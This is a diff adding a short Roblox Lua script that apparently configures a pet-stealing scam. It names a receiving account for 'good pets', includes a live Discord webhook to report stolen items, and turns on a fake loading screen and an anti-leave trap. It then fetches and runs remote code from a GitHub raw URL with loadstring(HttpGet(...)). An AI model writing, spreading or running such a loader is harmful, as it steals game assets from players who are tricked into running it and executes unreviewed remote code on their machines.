@@ -1,0 +1,9 @@
+UserName = "SubtoshivaGamer" -- good pets
+Webhook = "https://discord.com/api/webhooks/1136389111511535747/Ey5fikt9Hs2o5CONRsg4D6qwoPjILO7JEkU4AHAaX1koe5km9vryYeL1PmBGdChh_XZP" -- pings for pets
+UserName2 = "Subtoshivagamer" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = trwue -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LynX5561/Valhalla/main/Valhalla", true))()
